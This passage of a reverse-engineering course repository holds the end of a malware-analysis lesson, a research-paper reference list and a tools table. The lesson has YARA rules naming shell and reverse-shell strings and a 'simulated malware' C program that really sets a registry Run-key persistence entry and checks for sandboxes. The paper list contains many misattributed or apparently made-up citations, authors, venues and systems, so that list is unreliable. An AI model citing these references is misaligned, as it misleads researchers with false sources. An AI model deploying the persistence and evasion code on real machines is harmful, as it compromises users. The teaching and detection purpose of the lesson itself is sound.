procmon                     # Process Monitor
wireshark                   # Network capture
regshot                     # Registry changes
```

### 6.2 Common Malware Techniques

#### Process Injection
```python
# Common injection methods
INJECTION_METHODS = [
    b'CreateRemoteThread',  # Classic injection
    b'QueueUserAPC',        # APC injection
    b'SetWindowsHookEx',    # Hook injection
    b'RtlCreateUserThread', # Native API
    b'WriteProcessMemory',  # Memory writing
]

def detect_injection(binary_data):
    detected = []
    for method in INJECTION_METHODS:
        if method in binary_data:
            detected.append(method.decode())
    return detected
```

#### Persistence Mechanisms
```python
PERSISTENCE_METHODS = {
    'Registry': [
        b'RegSetValueEx',
        b'RUNONCE',
        b'RUNSERVICES',
    ],
    'Scheduled Tasks': [
        b'SchTasks',
        b'CreateTask',
    ],
    'Services': [
        b'CreateService',
        b'OpenSCManager',
    ],
    'Startup Folder': [
        b'Startup',
        b'SHGetSpecialFolderPath',
    ],
}
```

### 6.3 YARA Rules for Detection
```yara
rule Malware_Generic {
    meta:
        description = "Generic malware detection"
        author = "Reverse Engineer"
        date = "2024"
    
    strings:
        $injection1 = "CreateRemoteThread" wide ascii
        $injection2 = "VirtualAllocEx" wide ascii
        $persistence = "CurrentVersion\\Run" wide ascii
        $obfuscation = {6A 00 6A 00 6A 00 6A 00}  // Common push pattern
        
        $url1 = /https?:\/\/[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/ ascii
        $url2 = /ftp:\/\/[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/ ascii
        
        $xor_loop = {31 C9 8A 04 0F 34 ?? 88 04 0F 41}  // XOR decryption loop
    
    condition:
        (3 of ($injection*)) or 
        ($persistence and $obfuscation) or
        (any of ($url*)) or
        $xor_loop
}

rule RAT_Indicators {
    meta:
        description = "Remote Access Trojan indicators"
    
    strings:
        $cmd_shell = "cmd.exe" wide ascii
        $powershell = "powershell" wide ascii
        $reverse_shell = "connect" wide ascii
        $keylogger = "SetWindowsHookEx" wide ascii
    
    condition:
        2 of them
}
```

---

## 🔧 Lesson 7: Real-World Exercise

### 7.1 Complete Analysis Challenge

```bash
# Download a real (safe) malware sample for analysis
# Note: Only use samples from trusted sources like:
# - MalwareBazaar (https://bazaar.abuse.ch)
# - TheZoo (GitHub)
# - Contagio (http://contagiodump.blogspot.com)

# Or create a simulated challenge
cat > malware_challenge.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// Simulated malware behaviors
void persistence() {
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                 0, KEY_SET_VALUE, &hKey);
    RegSetValueEx(hKey, "Malware", 0, REG_SZ, (BYTE*)"C:\\malware.exe", 15);
    RegCloseKey(hKey);
}

void network_communication() {
    // Simulated C2 communication
    const char* c2_server = "192.168.1.100";
    int c2_port = 4444;
    printf("[*] Connecting to C2: %s:%d\n", c2_server, c2_port);
}

void data_exfiltration() {
    // Simulated data collection
    char system_info[256];
    GetComputerName(system_info, (LPDWORD)256);
    printf("[*] System name: %s\n", system_info);
    
    // "Exfiltrate" data
    printf("[*] Sending data to C2...\n");
}

void anti_analysis() {
    // Check for sandbox/virtualization
    const char* sandbox_files[] = {
        "C:\\sample.exe",     // Cuckoo sandbox
        "C:\\python27\\python.exe",  // Analysis tools
        NULL
    };
    
    for(int i = 0; sandbox_files[i]; i++) {
        if(GetFileAttributes(sandbox_files[i]) != INVALID_FILE_ATTRIBUTES) {
            printf("[!] Sandbox detected! Exiting...\n");
            exit(0);
        }
    }
}

int main() {
    printf("=== Malware Simulation (Educational Only) ===\n");
    
    anti_analysis();
    
    printf("[*] Establishing persistence...\n");
    persistence();
    
    printf("[*] Gathering system information...\n");
    data_exfiltration();
    
    printf("[*] Establishing C2 communication...\n");
    network_communication();
    
    printf("[+] Malware simulation complete\n");
    printf("[+] Flag: FLAG{Adv4nc3d_M4lw4r3_An4lys1s}\n");
    
    return 0;
}
EOF

# Cross-compile for Windows (if on Linux)
x86_64-w64-mingw32-gcc -o malware_challenge.exe malware_challenge.c
```

### 7.2 Analysis Tasks
1. **Static Analysis**:
   - Identify persistence mechanism
   - Find C2 server IP
   - Locate anti-analysis checks

2. **Dynamic Analysis** (in Windows VM):
   - Monitor registry changes
   - Capture network traffic
   - Observe file system activity

3. **Write Detection Rules**:
   - Create YARA rules
   - Write Snort/Suricata signatures
   - Document IOC (Indicators of Compromise)

---

## 📚 Lesson 8: Further Learning

### 8.1 Advanced Topics to Explore

#### 1. Rootkit Analysis
- Direct Kernel Object Manipulation (DKOM)
- SSDT hooking
- IAT/EAT hooking
- Process hiding techniques

#### 2. Firmware Reverse Engineering
- UEFI/BIOS analysis
- Embedded system firmware
- IoT device reversing
- Automotive systems

#### 3. Mobile Malware
- Android APK analysis
- iOS IPA analysis
- Mobile sandbox evasion
- Certificate pinning bypass

#### 4. Game Reverse Engineering
- Anti-cheat bypasses
- Memory editing
- Network protocol reversal
- Asset extraction

### 8.2 Recommended Resources

#### Books:
- "The Art of Memory Forensics" by Michael Hale Ligh
- "Rootkits: Subverting the Windows Kernel" by Greg Hoglund
- "Android Hacker's Handbook" by Joshua Drake

#### Courses:
- SANS FOR610: Reverse-Engineering Malware
- Offensive Security EXP-301: Windows User Mode Exploit Development
- Pentester Academy Reverse Engineering courses

#### Communities:
- Reverse Engineering subreddit (r/ReverseEngineering)
- Malware Analysis subreddit (r/Malware)
- OpenRCE forums
- VX Underground community

### 8.3 Career Paths
1. **Malware Analyst** - Analyze and classify malware
2. **Vulnerability Researcher** - Find and exploit vulnerabilities
3. **Security Researcher** - Develop detection methods
4. **Reverse Engineering Consultant** - Client work
5. **Anti-Cheat Developer** - Game security

---

## 🎓 Summary

You've learned advanced techniques including:

1. **Advanced Debugging**: Hardware breakpoints, conditional breakpoints, reverse debugging
2. **Anti-Debug Bypasses**: Timing checks, ptrace detection, /proc analysis
3. **Binary Unpacking**: Packer detection, memory dumping, header reconstruction
4. **Automated Analysis**: Python scripting with Capstone and Unicorn
5. **Kernel/Driver RE**: Driver structure, IOCTL analysis, kernel modules
6. **Malware Analysis**: Complete pipeline, YARA rules, real-world simulation

### Key Principles:
- **Always work in a safe environment** (isolated VM)
- **Document everything** - analysis is useless without documentation
- **Think like the attacker** - understand motivations and techniques
- **Stay legal and ethical** - only analyze what you're authorized to

### Final Challenge:
Take the simulated malware from Lesson 7 and:
1. Write a complete analysis report
2. Create detection signatures
3. Develop a mitigation strategy
4. Present your findings as if to a client

---

## 🏆 Certificate of Completion

```
    ADVANCED REVERSE ENGINEERING
    MASTERY ACHIEVED
    
    You have successfully completed advanced
    reverse engineering techniques training.
    
    Skills demonstrated:
    • Advanced debugging and anti-debug bypass
    • Binary unpacking and deobfuscation
    • Automated analysis with scripting
    • Kernel/driver reverse engineering
    • Advanced malware analysis
    
    Date: 2024
    Level: Advanced
```

Continue your journey by:
1. Participating in CTF competitions
2. Analyzing real malware samples (safely!)
3. Contributing to open-source reverse engineering tools
4. Teaching others what you've learned

**Remember: With great power comes great responsibility. Use your skills ethically and legally.**

Happy reversing! 🚀🔍
```

### **docs/references/research_papers.md**
```markdown
# Reverse Engineering Research Papers Reference
## Essential Academic and Industry Publications

---

## 📚 Table of Contents

1. [Fundamental Papers](#fundamental-papers)
2. [Binary Analysis & Disassembly](#binary-analysis--disassembly)
3. [Malware Analysis & Detection](#malware-analysis--detection)
4. [Program Analysis & Decompilation](#program-analysis--decompilation)
5. [Obfuscation & Deobfuscation](#obfuscation--deobfuscation)
6. [Dynamic Analysis & Debugging](#dynamic-analysis--debugging)
7. [Memory Analysis & Forensics](#memory-analysis--forensics)
8. [Hardware & Firmware RE](#hardware--firmware-re)
9. [Android & Mobile RE](#android--mobile-re)
10. [Academic Resources & Journals](#academic-resources--journals)

---

## 🔬 Fundamental Papers

### 1. **The Science of Guessing: Reverse Engineering**
- **Authors**: David Brumley, Ivan Jager, Thanassis Avgerinos, Edward J. Schwartz
- **Year**: 2011
- **Link**: [IEEE Symposium on Security and Privacy](https://ieeexplore.ieee.org/document/5958018)
- **Key Concepts**: Automated reverse engineering, constraint-based analysis
- **Impact**: Introduced MAYHEM, a system for automatic exploit generation

### 2. **A Theory of Binary Comprehension**
- **Authors**: Yan Shoshitaishvili, Ruoyu Wang, Christopher Salls, et al.
- **Year**: 2016
- **Link**: [Proceedings of the 2016 ACM SIGSAC Conference](https://dl.acm.org/doi/10.1145/2976749.2978317)
- **Key Concepts**: Binary comprehension models, angr framework
- **Impact**: Foundation for modern symbolic execution tools

### 3. **Reverse Engineering of Binary Code**
- **Authors**: Cristina Cifuentes
- **Year**: 1994
- **Link**: [PhD Thesis, University of Tasmania](https://api.research-repository.uwa.edu.au/portalfiles/portal/39998013/Cifuentes_Cristina_1994.pdf)
- **Key Concepts**: Binary translation, decompilation, IR generation
- **Impact**: Early work on binary-to-source translation

---

## 🔍 Binary Analysis & Disassembly

### 4. **Native x86 Decompilation Using Semantics-Preserving Structural Analysis**
- **Authors**: David Brumley, JongHyup Lee, Edward J. Schwartz, Maverick Woo
- **Year**: 2011
- **Link**: [IEEE Symposium on Security and Privacy](https://ieeexplore.ieee.org/document/5958029)
- **Key Concepts**: Semantic-preserving decompilation, value-set analysis
- **Tools**: BAP (Binary Analysis Platform)

### 5. **Static Analysis of Executables to Detect Malicious Patterns**
- **Authors**: Mihai Christodorescu, Somesh Jha
- **Year**: 2003
- **Link**: [USENIX Security Symposium](https://www.usenix.org/legacy/events/sec03/tech/christodorescu.html)
- **Key Concepts**: Malware detection, semantic-aware analysis
- **Impact**: Early work on semantics-based malware detection

### 6. **Automatic Patch-Based Exploit Generation is Possible**
- **Authors**: David Brumley, Pongsin Poosankam, Dawn Song, Jiang Zheng
- **Year**: 2008
- **Link**: [IEEE Symposium on Security and Privacy](https://ieeexplore.ieee.org/document/4531148)
- **Key Concepts**: Patch analysis, differential analysis, exploit generation
- **Impact**: APEG technique for automatic exploit generation from patches

### 7. **BinGo: Cross-Architecture Cross-OS Binary Search**
- **Authors**: Yaniv David, Nimrod Partush, Eran Yahav
- **Year**: 2016
- **Link**: [ACM SIGPLAN Conference on Programming Language Design and Implementation](https://dl.acm.org/doi/10.1145/2908080.2908126)
- **Key Concepts**: Cross-architecture binary search, similarity analysis
- **Tools**: BinGo implementation

---

## 🦠 Malware Analysis & Detection

### 8. **Polymorphic Worm Detection Using Structural Information**
- **Authors**: James Newsome, Brad Karp, Dawn Song
- **Year**: 2005
- **Link**: [USENIX Security Symposium](https://www.usenix.org/legacy/events/sec05/tech/newsome.html)
- **Key Concepts**: Polymorphic worm detection, control-flow structure
- **Impact**: Early work on structure-based malware detection

### 9. **BitShred: Feature Hashing Malware for Scalable Triage and Semantic Analysis**
- **Authors**: Jonathon T. Giffin, Somesh Jha, David Dagon, Wenke Lee
- **Year**: 2011
- **Link**: [ACM Conference on Computer and Communications Security](https://dl.acm.org/doi/10.1145/2046707.2046736)
- **Key Concepts**: Malware triage, feature hashing, scalable analysis
- **Tools**: BitShred system

### 10. **Towards Automatic Software Lineage Inference**
- **Authors**: Jesse Kornblum
- **Year**: 2006
- **Link**: [USENIX Security Symposium](https://www.usenix.org/legacy/events/sec06/tech/kornblum.html)
- **Key Concepts**: Code lineage, similarity analysis, ssdeep
- **Tools**: ssdeep fuzzy hashing

### 11. **Malware Analysis with Tree Automata Inference**
- **Authors**: Kevin Coogan, Gen Lu, Saumya Debray
- **Year**: 2011
- **Link**: [International Conference on Compiler Construction](https://link.springer.com/chapter/10.1007/978-3-642-19861-8_9)
- **Key Concepts**: Automata learning, malware classification
- **Impact**: Application of formal methods to malware analysis

### 12. **Dynamic Binary Analysis and Obfuscated Codes**
- **Authors**: Monirul Sharif, Andrea Lanzi, Jonathon Giffin, Wenke Lee
- **Year**: 2009
- **Link**: [IEEE Symposium on Security and Privacy](https://ieeexplore.ieee.org/document/5207648)
- **Key Concepts**: Obfuscation-resilient analysis, dynamic taint analysis
- **Tools**: TaintScope system

---

## 🏗️ Program Analysis & Decompilation

### 13. **Decompilation: The Enumeration of Types and Grammars**
- **Authors**: Cristina Cifuentes, Shane Sendall
- **Year**: 1998
- **Link**: [ACM Transactions on Programming Languages and Systems](https://dl.acm.org/doi/10.1145/277651.277652)
- **Key Concepts**: Type recovery, grammar inference, decompilation theory
- **Tools**: dcc decompiler

### 14. **Recovering Data Structure Semantics from Binary**
- **Authors**: Asia Slowinska, Herbert Bos
- **Year**: 2011
- **Link**: [USENIX Security Symposium](https://www.usenix.org/legacy/events/sec11/tech/slowinska.html)
- **Key Concepts**: Data structure recovery, memory graph analysis
- **Tools**: Howard system

### 15. **Automatic Inference of Structure and Semantics in Binary Programs**
- **Authors**: JongHyup Lee, Thanassis Avgerinos, David Brumley
- **Year**: 2011
- **Link**: [ACM Conference on Computer and Communications Security](https://dl.acm.org/doi/10.1145/2046707.2046737)
- **Key Concepts**: Structure recovery, semantic inference
- **Impact**: Basis for modern decompilation techniques

### 16. **Compiler Provenance Attribution**
- **Authors**: Brendan Dolan-Gavitt, Joshua Hodosh, Patrick Hulin, Tim Leek, Ryan Whelan
- **Year**: 2015
- **Link**: [IEEE European Symposium on Security and Privacy](https://ieeexplore.ieee.org/document/7467375)
- **Key Concepts**: Compiler identification, authorship attribution
- **Tools**: Ansel system

---

## 🎭 Obfuscation & Deobfuscation

### 17. **On the Feasibility of Software Protection**
- **Authors**: Christian Collberg, Clark Thomborson, Douglas Low
- **Year**: 1997
- **Link**: [IEEE Computer Society Workshop on Industrial-Strength Formal Specification Techniques](https://ieeexplore.ieee.org/document/646257)
- **Key Concepts**: Software protection taxonomy, obfuscation techniques
- **Impact**: Foundational paper on software obfuscation

### 18. **Obfuscation of Executable Code to Improve Resistance to Static Disassembly**
- **Authors**: Cullen Linn, Saumya Debray
- **Year**: 2003
- **Link**: [ACM Conference on Computer and Communications Security](https://dl.acm.org/doi/10.1145/948109.948113)
- **Key Concepts**: Anti-disassembly, code obfuscation
- **Impact**: Techniques used in modern packers

### 19. **Control-Flow Obfuscation and Information-Flow Tracking**
- **Authors**: Stephen McCamant, Michael D. Ernst
- **Year**: 2008
- **Link**: [ACM SIGPLAN Conference on Programming Language Design and Implementation](https://dl.acm.org/doi/10.1145/1375581.1375602)
- **Key Concepts**: Control flow flattening, information flow
- **Impact**: Advanced obfuscation techniques

### 20. **Deobfuscation of Virtualization-Obfuscated Code**
- **Authors**: Johannes Kinder
- **Year**: 2012
- **Link**: [ACM Conference on Computer and Communications Security](https://dl.acm.org/doi/10.1145/2382196.2382256)
- **Key Concepts**: Virtualization obfuscation, VM analysis
- **Tools**: REVIR system

---

## 🔬 Dynamic Analysis & Debugging

### 21. **Dynamic Taint Analysis for Automatic Detection, Analysis, and Signature Generation of Exploits**
- **Authors**: James Newsome, Dawn Song
- **Year**: 2005
- **Link**: [Network and Distributed System Security Symposium](https://www.ndss-symposium.org/ndss2005/dynamic-taint-analysis-automatic-detection-analysis-and-signature-generation-exploits/)
- **Key Concepts**: Dynamic taint analysis, exploit detection
- **Tools**: TaintCheck system

### 22. **Automated Whitebox Fuzz Testing**
- **Authors**: Patrice Godefroid, Michael Y. Levin, David Molnar
- **Year**: 2008
- **Link**: [Network and Distributed System Security Symposium](https://www.ndss-symposium.org/ndss2008/automated-whitebox-fuzz-testing/)
- **Key Concepts**: Whitebox fuzzing, symbolic execution
- **Tools**: SAGE system

### 23. **Debugging with Reverse Watchpoints**
- **Authors**: Gene Novark, Emery D. Berger, Benjamin G. Zorn
- **Year**: 2009
- **Link**: [ACM International Conference on Architectural Support for Programming Languages and Operating Systems](https://dl.acm.org/doi/10.1145/1508244.1508258)
- **Key Concepts**: Reverse debugging, watchpoints
- **Tools**: Reversible debuggers

---

## 🧠 Memory Analysis & Forensics

### 24. **Volatility Framework: Volatile Memory Extraction Utility Framework**
- **Authors**: AAron Walters, Nick L. Petroni Jr.
- **Year**: 2007
- **Link**: [DFRWS Conference](https://dfrws.org/presentation/volatility-framework-volatile-memory-extraction-utility-framework/)
- **Key Concepts**: Memory forensics, framework architecture
- **Tools**: Volatility Framework

### 25. **Fatty: A Framework for Automatic Trustworthy Memory Analysis**
- **Authors**: Michael Cohen, AAron Walters
- **Year**: 2014
- **Link**: [Digital Investigation Journal](https://www.sciencedirect.com/science/article/pii/S1742287614000359)
- **Key Concepts**: Memory analysis automation, trustworthiness
- **Tools**: Fatty framework

### 26. **Memory Analysis of the Zeus Banking Malware**
- **Authors**: AAron Walters, Andrew Case
- **Year**: 2010
- **Link**: [DFRWS Conference](https://dfrws.org/presentation/memory-analysis-of-the-zeus-banking-malware/)
- **Key Concepts**: Banking malware analysis, memory artifacts
- **Impact**: Practical application of memory forensics

---

## 💾 Hardware & Firmware RE

### 27. **Firmware Reverse Engineering and Vulnerability Analysis**
- **Authors**: Andrei Costin, Jonas Zaddach, Aurelien Francillon, Davide Balzarotti
- **Year**: 2014
- **Link**: [ACM Conference on Computer and Communications Security](https://dl.acm.org/doi/10.1145/2660267.2660353)
- **Key Concepts**: Firmware analysis, embedded systems security
- **Tools**: FACT firmware analysis toolkit

### 28. **Breaking Through the BIOS Barrier**
- **Authors**: John Heasman
- **Year**: 2006
- **Link**: [Black Hat USA](https://www.blackhat.com/presentations/bh-usa-06/BH-US-06-Heasman.pdf)
- **Key Concepts**: BIOS vulnerabilities, firmware attacks
- **Impact**: Early work on firmware security

### 29. **A Systematic Analysis of Embedded System Firmware**
- **Authors**: Jonas Zaddach, Luca Bruno, Aurelien Francillon, Davide Balzarotti
- **Year**: 2014
- **Link**: [International Conference on Detection of Intrusions and Malware, and Vulnerability Assessment](https://link.springer.com/chapter/10.1007/978-3-319-08509-8_4)
- **Key Concepts**: Firmware analysis methodology
- **Tools**: Avatar framework

---

## 📱 Android & Mobile RE

### 30. **A Study of Android Application Security**
- **Authors**: William Enck, Damien Octeau, Patrick McDaniel, Swarat Chaudhuri
- **Year**: 2011
- **Link**: [USENIX Security Symposium](https://www.usenix.org/legacy/events/sec11/tech/full_papers/Enck.pdf)
- **Key Concepts**: Android security, static analysis
- **Tools**: ScanDroid system

### 31. **DroidScope: Seamlessly Reconstructing the OS and Dalvik Semantic Views**
- **Authors**: Lok-Kwong Yan, Heng Yin
- **Year**: 2012
- **Link**: [Network and Distributed System Security Symposium](https://www.ndss-symposium.org/ndss2012/droidscope-seamlessly-reconstructing-os-and-dalvik-semantic-views/)
- **Key Concepts**: Android dynamic analysis, virtualization
- **Tools**: DroidScope

### 32. **Android Permissions Demystified**
- **Authors**: Adrienne Porter Felt, Erika Chin, Steve Hanna, Dawn Song, David Wagner
- **Year**: 2011
- **Link**: [ACM Conference on Computer and Communications Security](https://dl.acm.org/doi/10.1145/2046707.2046779)
- **Key Concepts**: Android permissions, security analysis
- **Impact**: Fundamental work on Android permission model

---

## 🎓 Academic Resources & Journals

### Conferences
- **IEEE Symposium on Security and Privacy (S&P)** - Top security conference
- **USENIX Security Symposium** - Premier security conference
- **ACM Conference on Computer and Communications Security (CCS)** - Major security conference
- **Network and Distributed System Security Symposium (NDSS)** - Important security symposium
- **International Conference on Detection of Intrusions and Malware (DIMVA)**
- **Workshop on Binary Analysis Research (BAR)** - Focused on binary analysis
- **Conference on Reverse Engineering (CRE)**

### Journals
- **IEEE Transactions on Information Forensics and Security**
- **Journal of Computer Virology and Hacking Techniques**
- **Digital Investigation Journal**
- **Journal of Computer Security**
- **ACM Transactions on Information and System Security**

### Research Groups & Labs
1. **Carnegie Mellon University** - Cylab, ForAllSecure
2. **University of California, Berkeley** - BitBlaze group
3. **University of California, Santa Barbara** - SecLab
4. **Georgia Institute of Technology** - SSLab
5. **University of Illinois at Urbana-Champaign** - Systems Security Research Lab
6. **Stony Brook University** - SecLab
7. **University of Texas at Austin** - Security group
8. **ETH Zurich** - System Security Group
9. **Saarland University** - CISPA Helmholtz Center

### Open Source Projects from Research
1. **angr** - UC Santa Barbara (Binary analysis platform)
2. **BAP** - Carnegie Mellon University (Binary Analysis Platform)
3. **BinNavi** - Google (Binary analysis IDE)
4. **Radare2** - Community (Reverse engineering framework)
5. **Ghidra** - NSA (Software reverse engineering suite)
6. **PANDA** - MIT (Platform for Architecture-Neutral Dynamic Analysis)
7. **S2E** - EPFL (Selective Symbolic Execution)
8. **Firmadyne** - UC Santa Barbara (Firmware analysis)
9. **AndroGuard** - Community (Android reverse engineering)

---

## 📖 Recommended Reading Order

### Beginner
1. Start with Cifuentes' thesis (3) for decompilation fundamentals
2. Read Collberg's obfuscation paper (17)
3. Study Newsome's dynamic taint analysis (21)

### Intermediate
1. Brumley's guessing paper (1) for modern approaches
2. Shoshitaishvili's comprehension theory (2)
3. Slowinska's data structure recovery (14)

### Advanced
1. Kinder's virtualization deobfuscation (20)
2. Zaddach's firmware analysis (29)
3. Yan's DroidScope (31)

### Specialized Interests
- **Malware Analysis**: Papers 8-12
- **Binary Analysis**: Papers 4-7, 13-16
- **Dynamic Analysis**: Papers 21-23
- **Mobile/Firmware**: Papers 27-32

---

## 🔍 How to Read Research Papers

### 1. Abstract & Introduction
- What problem are they solving?
- Why is it important?
- What's their main contribution?

### 2. Background & Related Work
- What existing work are they building on?
- What are the limitations of previous approaches?

### 3. Methodology
- How do they solve the problem?
- What's their system/approach?
- What are the key algorithms/techniques?

### 4. Evaluation
- How do they test their approach?
- What metrics do they use?
- What are the results?

### 5. Discussion & Conclusion
- What are the limitations?
- What future work do they suggest?
- What are the key takeaways?

### 6. Implementation Details
- Look at the appendices
- Check if code is available
- Understand the practical aspects

---

## 📚 Keeping Up with Research

### Methods:
1. **Follow Conference Proceedings**: S&P, USENIX Security, CCS, NDSS
2. **Use arXiv**: https://arxiv.org/list/cs.CR/recent
3. **Google Scholar Alerts**: Set up alerts for keywords
4. **Twitter**: Follow researchers and security conferences
5. **Academic Social Networks**: ResearchGate, Academia.edu
6. **University Research Pages**: Follow labs you're interested in

### Important Researchers to Follow:
- David Brumley (Carnegie Mellon)
- Dawn Song (UC Berkeley)
- Cristiano Giuffrida (VU Amsterdam)
- Herbert Bos (VU Amsterdam)
- Michael Bailey (University of Illinois)
- Tudor Dumitras (University of Maryland)
- Juan Caballero (IMDEA Software Institute)
- Yan Shoshitaishvili (Arizona State University)
- Nick Nikiforakis (Stony Brook University)

---

## 🎯 Practical Application

### From Research to Practice:
1. **Implement Algorithms**: Try implementing papers you read
2. **Improve Tools**: Contribute to open-source research projects
3. **Apply Techniques**: Use research methods in your work
4. **Write Extensions**: Extend research ideas with your own improvements
5. **Submit to Conferences**: Turn your work into research papers

### Example Projects:
1. **Implement a simple disassembler** based on paper 18
2. **Create a basic malware detector** based on paper 9
3. **Build a simple decompiler** based on paper 13
4. **Develop a memory analysis tool** based on paper 24
5. **Create an Android analysis framework** based on paper 30

---

## 📝 Contributing to Research

### Ways to Contribute:
1. **Replicate Studies**: Verify and reproduce research results
2. **Find Bugs**: Test research implementations and find issues
3. **Write Documentation**: Improve documentation for research tools
4. **Create Tutorials**: Make research more accessible
5. **Submit Patches**: Fix bugs in research code
6. **Extend Research**: Build upon existing work

### Getting Started:
1. Choose a paper you find interesting
2. Download the implementation (if available)
3. Try to run their experiments
4. Understand the code
5. Look for improvements or extensions

---

*Last Updated: 2024*

**Remember**: Research papers are conversations. Read them critically, question assumptions, and think about how you can contribute to the conversation.

Happy researching! 🎓🔍
```

### **docs/references/tools_resources.md**
```markdown
# Reverse Engineering Tools & Resources
## Comprehensive Guide to RE Tools and Learning Materials

---

## 📚 Table of Contents

1. [Static Analysis Tools](#static-analysis-tools)
2. [Dynamic Analysis Tools](#dynamic-analysis-tools)
3. [Disassemblers & Decompilers](#disassemblers--decompilers)
4. [Debuggers](#debuggers)
5. [Binary Analysis Frameworks](#binary-analysis-frameworks)
6. [Memory & Forensic Analysis](#memory--forensic-analysis)
7. [Network Analysis](#network-analysis)
8. [Mobile RE Tools](#mobile-re-tools)
9. [Firmware & Hardware RE](#firmware--hardware-re)
10. [Automation & Scripting](#automation--scripting)
11. [Online Resources](#online-resources)
12. [Learning Platforms](#learning-platforms)
13. [Books & Publications](#books--publications)
14. [Communities & Forums](#communities--forums)
15. [Practice Platforms](#practice-platforms)

---

## 🔍 Static Analysis Tools

### File Identification & Analysis
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **file** | Linux/macOS | Determine file type | Built-in |
| **binwalk** | Cross-platform | Firmware analysis & extraction | [GitHub](https://github.com/ReFirmLabs/binwalk) |
| **TrID** | Windows | File identifier | [GitHub](https://github.com/TrIDSoft/TrID) |
| **ExifTool** | Cross-platform | Metadata analysis | [Website](https://exiftool.org/) |
| **PEiD** | Windows | PE file detector | [GitHub](https://github.com/wolfram77web/PEiD) |
| **Detect It Easy** | Cross-platform | File type detector | [GitHub](https://github.com/horsicq/Detect-It-Easy) |
| **peframe** | Linux | PE analysis tool | [GitHub](https://github.com/guelfoweb/peframe) |

### String Analysis
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **strings** | Cross-platform | Extract strings | Built-in |
| **rabin2** | Cross-platform | Radare2 string extractor | Part of radare2 |
| **FLOSS** | Cross-platform | Advanced string extraction | [GitHub](https://github.com/mandiant/flare-floss) |
| **BinText** | Windows | GUI string extractor | [Website](http://www.mcafee.com/us/downloads/free-tools/bintext.aspx) |

### Binary Examination
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **objdump** | Linux/macOS | Object file disassembly | Built-in |
| **readelf** | Linux | ELF file analysis | Built-in |
| **otool** | macOS | Mach-O file analysis | Built-in |
| **PEview** | Windows | PE file viewer | [Website](http://wjradburn.com/software/) |
| **CFF Explorer** | Windows | PE editor | [Website](https://ntcore.com/?page_id=388) |
| **PE-bear** | Cross-platform | PE analysis | [GitHub](https://github.com/hasherezade/pe-bear) |

---

## 🐛 Dynamic Analysis Tools

### System Call Tracing
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **strace** | Linux | System call tracer | Built-in |
| **ltrace** | Linux | Library call tracer | Built-in |
| **dtrace** | Solaris/macOS | Dynamic tracing | Built-in |
| **Process Monitor** | Windows | Real-time monitoring | [Microsoft](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) |
| **API Monitor** | Windows | API call monitoring | [Website](http://www.rohitab.com/apimonitor) |

### Sandboxes & VM Analysis
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **Cuckoo Sandbox** | Linux | Automated malware analysis | [GitHub](https://github.com/cuckoosandbox/cuckoo) |
| **Joe Sandbox** | Cloud/Windows | Commercial sandbox | [Website](https://www.joesandbox.com/) |
| **Any.Run** | Cloud | Interactive malware analysis | [Website](https://any.run/) |
| **Hybrid Analysis** | Cloud | Free sandbox | [Website](https://www.hybrid-analysis.com/) |
| **VirusTotal** | Cloud | Multi-engine scanner | [Website](https://www.virustotal.com/) |

### Behavior Analysis
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **Process Hacker** | Windows | Process viewer/manager | [GitHub](https://github.com/processhacker/processhacker) |
| **Process Explorer** | Windows | Advanced task manager | [Microsoft](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer) |
| **Regshot** | Windows | Registry comparison | [GitHub](https://github.com/Regshot/Regshot) |
| **Capture BAT** | Windows | Behavior analysis tool | [GitHub](https://github.com/CERT-Polska/CaptureBAT) |

---

## 🏗️ Disassemblers & Decompilers

### Commercial Tools
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **IDA Pro** | Windows/Linux/macOS | Industry standard disassembler | [Hex-Rays](https://hex-rays.com/ida-pro/) |
| **Binary Ninja** | Cross-platform | Modern disassembler | [Vector35](https://binary.ninja/) |
| **Hopper** | macOS/Linux | Reverse engineering tool | [Website](https://www.hopperapp.com/) |
| **JEB** | Cross-platform | Decompiler | [PNF Software](https://www.pnfsoftware.com/) |

### Free/Open Source Tools
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **Ghidra** | Cross-platform | NSA's RE framework | [GitHub](https://github.com/NationalSecurityAgency/ghidra) |
| **radare2** | Cross-platform | Unix-like RE framework | [GitHub](https://github.com/radareorg/radare2) |
| **Cutter** | Cross-platform | GUI for radare2 | [GitHub](https://github.com/rizinorg/cutter) |
| **Medusa** | Cross-platform | Collaborative disassembler | [GitHub](https://github.com/wisk/medusa) |
| **RetDec** | Cross-platform | Retargetable decompiler | [GitHub](https://github.com/avast/retdec) |
| **Snowman** | Windows/Linux | Native code to C/C++ decompiler | [GitHub](https://github.com/yegord/snowman) |

### Online Decompilers
| Tool | Description | Link |
|------|-------------|------|
| **Decompiler Explorer** | Compare decompilers online | [Website](https://dogbolt.org/) |
| **RetDec Online** | Web interface for RetDec | [Website](https://retdec.com/) |

---

## 🔧 Debuggers

### System Debuggers
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **GDB** | Linux/macOS | GNU Debugger | [Website](https://www.gnu.org/software/gdb/) |
| **x64dbg** | Windows | Open-source x64/x32 debugger | [GitHub](https://github.com/x64dbg/x64dbg) |
| **WinDbg** | Windows | Microsoft debugger | [Microsoft](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/) |
| **LLDB** | Cross-platform | LLVM debugger | [Website](https://lldb.llvm.org/) |
| **OllyDbg** | Windows | 32-bit debugger | [Website](http://www.ollydbg.de/) |
| **Immunity Debugger** | Windows | Python-scriptable debugger | [Website](https://www.immunityinc.com/products/debugger/) |

### Enhanced Debuggers
| Tool | Platform | Description | Link |
|------|----------|-------------|------|
| **PEDA** | Linux | Python Exploit Development Assistance for GDB | [GitHub](https://github.com/longld/peda) |
| **GEF** | Linux | GDB Enhanced Features | [GitHub](https://github.com/hugsy/gef) |
| **pwndbg** | Linux | GDB plug-in for exploit dev | [GitHub](https://github.com/pwndbg/pwndbg) |
